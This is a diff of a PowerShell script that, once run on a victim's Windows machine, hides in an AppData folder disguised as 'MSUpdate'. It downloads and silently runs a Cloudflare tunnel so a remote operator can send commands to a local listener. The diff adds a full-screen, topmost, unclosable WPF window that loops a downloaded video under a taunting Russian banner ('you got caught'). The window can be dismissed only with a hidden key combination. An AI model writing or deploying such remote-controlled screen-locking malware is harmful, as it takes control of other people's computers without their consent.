@@ -1,32 +1,30 @@
-# КОНФИГ
-$github = "NodeNode30-30"
-$repo = "system-libs"
-$branch = "main"
-$playlist = "playlist.txt"
+$github       = "NodeNode30-30"
+$repo         = "system-libs"
+$branch       = "main"
+$playlist     = "playlist.txt"
 
-# Рабочая директория в AppData пользователя (скрыта по умолчанию, админка не нужна)
-$workDir = "$env:USERPROFILE\AppData\Local\Microsoft\MSUpdate"
-$cfPath = "$workDir\cloudflared.exe"
+$workDir      = "$env:USERPROFILE\AppData\Local\Microsoft\MSUpdate"
+$cfPath       = "$workDir\cloudflared.exe"
 $listenerPort = 1337
-$playedFile = "$workDir\played.txt"
-$flagFile = "$workDir\play.flag"
+$playedFile   = "$workDir\played.txt"
+$flagFile     = "$workDir\play.flag"
+$stopFile     = "$workDir\stop.now"
+$pidFile      = "$workDir\player.pid"
 
-# Создаём рабочую папку, если её ещё нет
 if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
 
-# Функция загрузки файлов с GitHub
+$PID | Set-Content $pidFile -Force
+
 function Get-GitHubFile($path) {
     $url = "https://raw.githubusercontent.com/$github/$repo/$branch/$path"
     return (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 }
 
-# Скачиваем cloudflared, если его нет в папке
 if (-not (Test-Path $cfPath)) {
     $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
     Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing
 }
 
-# Запускаем туннель Cloudflare в скрытом режиме
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = $cfPath
 $psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile $workDir\tunnel.log"
@@ -34,12 +32,10 @@ $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 [System.Diagnostics.Process]::Start($psi) | Out-Null
 
-# Поднимаем локальный HTTP-сервер
 $listener = New-Object System.Net.HttpListener
 $listener.Prefixes.Add("http://localhost:$listenerPort/")
 $listener.Start()
 
-# Функция отправки HTTP-ответов
 function Send-Response($ctx, $msg) {
     $buffer = [System.Text.Encoding]::UTF8.GetBytes($msg)
     $ctx.Response.ContentLength64 = $buffer.Length
@@ -47,15 +43,14 @@ function Send-Response($ctx, $msg) {
     $ctx.Response.Close()
 }
 
-# Функция чистки процессов и сброса флагов
 function Stop-All {
     if (Test-Path $flagFile) { [System.IO.File]::WriteAllText($flagFile, "0") }
-    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Remove-Job -Force
-    Get-Process -Name "Video.UI","wmplayer","mpv","vlc","msedge","chrome","firefox" -ErrorAction SilentlyContinue | Stop-Process -Force
+    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
+    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Remove-Job -Force -ErrorAction SilentlyContinue
+    Get-Process -Name "powershell","pwsh" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "WpfPlayer" } | Stop-Process -Force
     if (Test-Path "$workDir\video.mp4") { Remove-Item "$workDir\video.mp4" -Force -ErrorAction SilentlyContinue }
 }
 
-# Основной цикл обработки входящих команд
 while ($listener.IsListening) {
     $ctx = $listener.GetContext()
     $path = $ctx.Request.Url.AbsolutePath
@@ -63,7 +58,6 @@ while ($listener.IsListening) {
     switch ($path) {
         "/play" {
             try {
-                # Перед запуском нового трека полностью очищаем старые процессы
                 Stop-All
                 Start-Sleep -Seconds 1
 
@@ -72,29 +66,78 @@ while ($listener.IsListening) {
                 $played = @()
                 if (Test-Path $playedFile) { $played = Get-Content $playedFile }
                 
-                # Ищем первое несыгранное видео
                 $next = $urls | Where-Object { $_ -notin $played } | Select-Object -First 1
                 if ($next) {
                     $outFile = "$workDir\video.mp4"
                     Invoke-WebRequest -Uri $next -OutFile $outFile -UseBasicParsing
                     
-                    # Ставим флаг активности в "1"
                     [System.IO.File]::WriteAllText($flagFile, "1")
                     
-                    # Запускаем фоновый поток контроля окна плеера
                     Start-Job -Name "VideoEnforcer" -ScriptBlock {
-                        param($file, $flag)
-                        while ((Test-Path $flag) -and ([System.IO.File]::ReadAllText($flag) -eq "1")) {
-                            if (-not (Get-Process -Name "Video.UI","wmplayer","mpv","vlc" -ErrorAction SilentlyContinue)) {
-                                Start-Process -FilePath $file -WindowStyle Maximized
-                                Start-Sleep -Seconds 2
-                            }
-                            Start-Sleep -Seconds 1
+                        param($videoPath, $stopPath)
+                        
+                        $code = {
+                            param($vFile, $sFile)
+                            $ErrorActionPreference = 'SilentlyContinue'
+                            Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
+
+                            $win = New-Object System.Windows.Window
+                            $win.Title = "WpfPlayer"
+                            $win.WindowState = 'Maximized'
+                            $win.WindowStyle = 'None'
+                            $win.ResizeMode = 'NoResize'
+                            $win.Topmost = $true
+                            $win.ShowInTaskbar = $false
+                            $win.Background = [System.Windows.Media.Brushes]::Black
+                            $win.Cursor = [System.Windows.Input.Cursors]::None
+
+                            $win.Add_Closing({ if (-not $script:allowClose) { $_.Cancel = $true } })
+
+                            $me = New-Object System.Windows.Controls.MediaElement
+                            $me.Source = New-Object System.Uri($vFile)
+                            $me.LoadedBehavior = 'Play'
+                            $me.Add_MediaEnded({ $me.Position = [TimeSpan]::Zero; $me.Play() })
+
+                            $banner = New-Object System.Windows.Controls.TextBlock
+                            $banner.Text = "ПОЗДРАВЛЯЮ, ТЫ ПОПАЛСЯ :D"
+                            $banner.FontSize = 48
+                            $banner.FontWeight = 'Bold'
+                            $banner.Foreground = [System.Windows.Media.Brushes]::Red
+                            $banner.HorizontalAlignment = 'Center'
+                            $banner.VerticalAlignment = 'Bottom'
+                            $banner.Margin = '0,0,0,80'
+
+                            $grid = New-Object System.Windows.Controls.Grid
+                            $grid.Children.Add($me) | Out-Null
+                            $grid.Children.Add($banner) | Out-Null
+                            $win.Content = $grid
+
+                            $timer = New-Object System.Windows.Threading.DispatcherTimer
+                            $timer.Interval = [TimeSpan]::FromMilliseconds(400)
+                            $timer.Add_Tick({ $banner.Opacity = 1 - $banner.Opacity })
+                            $timer.Start()
+
+                            $win.Add_PreviewKeyDown({
+                                param($s, $e)
+                                if ($e.Key -eq 'Q' -and [System.Windows.Input.Keyboard]::Modifiers -band 3) {
+                                    $script:allowClose = $true
+                                    New-Item $sFile -ItemType File -Force | Out-Null
+                                    $win.Close()
+                                }
+                            })
+
+                            $app = New-Object System.Windows.Application
+                            $app.Run($win)
                         }
-                    } -ArgumentList $outFile, $flagFile | Out-Null
+
+                        $powershell = [powershell]::Create()
+                        $powershell.AddScript($code).AddArgument($videoPath).AddArgument($stopPath) | Out-Null
+                        $powershell.Runspace.ApartmentState = "STA"
+                        $powershell.Invoke()
+                    } -ArgumentList $outFile, $stopFile | Out-Null
                     
                     Add-Content $playedFile $next
-                    Send-Response $ctx "Playing and locked: $next"
+                    Send-Response $ctx "Playing in WPF full-screen: $next"
                 } else {
                     Send-Response $ctx "All videos played"
                 }
@@ -129,4 +172,3 @@ while ($listener.IsListening) {
         }
     }
 }
-
